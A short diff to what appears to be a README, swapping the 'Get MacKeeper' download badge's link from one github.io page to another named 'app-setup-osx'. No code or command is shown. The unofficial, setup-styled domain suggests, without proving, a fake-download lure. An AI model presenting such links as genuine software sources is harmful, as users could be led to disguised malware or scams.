@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://tomagsvi9.github.io/.github/mackeeper">  
+<a href="https://app-setup-osx.github.io/.github/mackeeper">  
 <img src="https://img.shields.io/badge/💻_Get_MacKeeper-ff4500?style=for-the-badge&logo=apple" alt="Get MacKeeper">  
 </a>  
 </div>  
